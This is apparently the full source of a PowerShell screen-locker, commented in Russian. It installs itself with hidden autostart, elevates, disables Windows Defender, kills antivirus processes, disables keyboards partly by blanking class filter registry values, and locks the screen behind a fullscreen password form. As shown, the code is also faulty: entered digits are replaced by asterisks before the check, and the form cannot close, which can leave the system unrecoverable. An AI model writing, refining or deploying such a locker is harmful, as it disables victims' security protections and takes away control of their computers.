# Zeta Ultimate Locker v2 — переработанная версия
# Не требует администратора для установки, но требует для блокировки

# ------------------------------------------------------------
# 1. Установка в систему (запуск без прав)
# ------------------------------------------------------------
$installPath = "$env:APPDATA\ZetaLocker"
if (!(Test-Path $installPath)) {
    New-Item -Path $installPath -ItemType Directory -Force | Out-Null
    Copy-Item $MyInvocation.MyCommand.Path "$installPath\locker.ps1" -Force
    # Добавляем в автозагрузку через реестр (не требует прав)
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "ZetaLocker" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$installPath\locker.ps1`""
    Write-Host "[✓] Установка завершена. При следующем входе локер активируется." -ForegroundColor Green
    Read-Host "Нажми Enter для выхода"
    exit
}

# ------------------------------------------------------------
# 2. Основная блокировка (запуск с правами)
# ------------------------------------------------------------
# Проверка прав для отключения клавиатуры и антивируса
$admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (!$admin) {
    # Перезапускаем с правами администратора
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# ------------------------------------------------------------
# 3. Отключаем Defender и антивирусы
# ------------------------------------------------------------
try {
    # Отключаем защиту в реальном времени
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    # Добавляем исключения
    Add-MpPreference -ExclusionPath $env:USERPROFILE -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
    # Останавливаем службу Defender
    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
    # Убиваем процессы антивирусов
    $avProcesses = @('MsMpEng', 'NisSrv', 'avp', 'avast', 'avguard', 'ekrn', 'egui', 'bdagent', 'vsserv', 'drweb', 'spider')
    foreach ($p in $avProcesses) {
        taskkill /f /im "${p}.exe" 2>$null
    }
    # Останавливаем службы антивирусов
    $avServices = @('WinDefend', 'wscsvc', 'KAV', 'avast', 'ESET', 'bd', 'DrWeb')
    foreach ($s in $avServices) {
        sc stop "${s}*" 2>$null
    }
} catch {
    # Если что-то не отключилось — игнорируем
}

# ------------------------------------------------------------
# 4. Блокируем клавиатуру (через реестр + PnP)
# ------------------------------------------------------------
try {
    # Метод 1: через PnP (быстро, но не всегда работает)
    $keyboards = Get-PnpDevice -Class Keyboard -ErrorAction SilentlyContinue
    foreach ($kb in $keyboards) {
        if ($kb.Status -eq 'OK') {
            Disable-PnpDevice -InstanceId $kb.InstanceId -Confirm:$false -ErrorAction SilentlyContinue
        }
    }
    # Метод 2: через реестр (гарантированно блокирует)
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4d36e96b-e325-11ce-bfc1-08002be10318}"
    $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
    foreach ($sub in $subKeys) {
        $key = $sub.PSPath
        Set-ItemProperty -Path $key -Name "UpperFilters" -Value "" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $key -Name "LowerFilters" -Value "" -ErrorAction SilentlyContinue
    }
} catch {
    # Если не удалось — просто продолжаем
}

# ------------------------------------------------------------
# 5. Форма с циферблатом (полноэкранная)
# ------------------------------------------------------------
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.FormBorderStyle = 'None'
$form.BackColor = 'Black'
$form.ControlBox = $false
$form.KeyPreview = $true

# Блокируем все системные комбинации
$form.Add_KeyDown({
    $_.SuppressKeyPress = $true
    if ($_.Alt -or $_.Control -or $_.KeyCode -eq 'F4' -or $_.KeyCode -eq 'Escape') {
        $_.SuppressKeyPress = $true
    }
})
$form.Add_FormClosing({
    $_.Cancel = $true
})

# Заголовок
$label = New-Object System.Windows.Forms.Label
$label.Text = "Введите пароль (только кнопки):"
$label.ForeColor = 'Red'
$label.Font = New-Object System.Drawing.Font('Arial', 24, [System.Drawing.FontStyle]::Bold)
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(50, 50)
$form.Controls.Add($label)

# Поле для звёздочек
$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Font = New-Object System.Drawing.Font('Arial', 28, [System.Drawing.FontStyle]::Bold)
$textBox.Size = New-Object System.Drawing.Size(300, 60)
$textBox.Location = New-Object System.Drawing.Point(100, 150)
$textBox.Text = ''
$textBox.ReadOnly = $true
$textBox.TextAlign = 'Center'
$textBox.BackColor = 'Gray'
$textBox.ForeColor = 'White'
$form.Controls.Add($textBox)

# Функция обновления звёздочек
function UpdateDisplay {
    $stars = '*' * $textBox.Text.Length
    $textBox.Text = $stars
}

# Генерация кнопок цифр
for ($i = 0; $i -le 9; $i++) {
    $btn = New-Object System.Windows.Forms.Button
    $btn.Text = $i.ToString()
    $btn.Font = New-Object System.Drawing.Font('Arial', 20, [System.Drawing.FontStyle]::Bold)
    $btn.Size = New-Object System.Drawing.Size(80, 80)
    $btn.BackColor = 'DarkGray'
    $btn.ForeColor = 'Black'
    $x = 100 + ($i % 3) * 100
    $y = 250 + [math]::Floor($i / 3) * 100
    $btn.Location = New-Object System.Drawing.Point($x, $y)
    $btn.Add_Click({
        $digit = $this.Text
        if ($textBox.Text.Length -lt 10) {
            $textBox.Text = $textBox.Text + $digit
            UpdateDisplay
        }
    })
    $form.Controls.Add($btn)
}

# Кнопка "Стереть"
$clearBtn = New-Object System.Windows.Forms.Button
$clearBtn.Text = '⌫'
$clearBtn.Font = New-Object System.Drawing.Font('Arial', 20, [System.Drawing.FontStyle]::Bold)
$clearBtn.Size = New-Object System.Drawing.Size(80, 80)
$clearBtn.Location = New-Object System.Drawing.Point(400, 250)
$clearBtn.BackColor = 'DarkOrange'
$clearBtn.Add_Click({
    if ($textBox.Text.Length -gt 0) {
        $textBox.Text = $textBox.Text.Substring(0, $textBox.Text.Length - 1)
        UpdateDisplay
    }
})
$form.Controls.Add($clearBtn)

# Кнопка "Ввод" (проверка пароля)
$enterBtn = New-Object System.Windows.Forms.Button
$enterBtn.Text = '✅'
$enterBtn.Font = New-Object System.Drawing.Font('Arial', 20, [System.Drawing.FontStyle]::Bold)
$enterBtn.Size = New-Object System.Drawing.Size(80, 80)
$enterBtn.Location = New-Object System.Drawing.Point(400, 350)
$enterBtn.BackColor = 'LimeGreen'
$enterBtn.Add_Click({
    $entered = $textBox.Text
    if ($entered -eq '133779') {
        # Пароль верный — разблокируем всё
        try {
            # Включаем клавиатуру через PnP
            $keyboards = Get-PnpDevice -Class Keyboard -ErrorAction SilentlyContinue
            foreach ($kb in $keyboards) {
                if ($kb.Status -ne 'OK') {
                    Enable-PnpDevice -InstanceId $kb.InstanceId -Confirm:$false -ErrorAction SilentlyContinue
                }
            }
            # Включаем защиту Defender обратно
            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        } catch {}
        $form.Close()
    } else {
        [System.Windows.Forms.MessageBox]::Show('Пароль неверный!', 'Zeta Error', 'OK', 'Error')
        $textBox.Text = ''
        UpdateDisplay
    }
})
$form.Controls.Add($enterBtn)

# Показываем форму
$form.ShowDialog() | Out-Null

# ------------------------------------------------------------
# 6. Выход
# ------------------------------------------------------------
exit
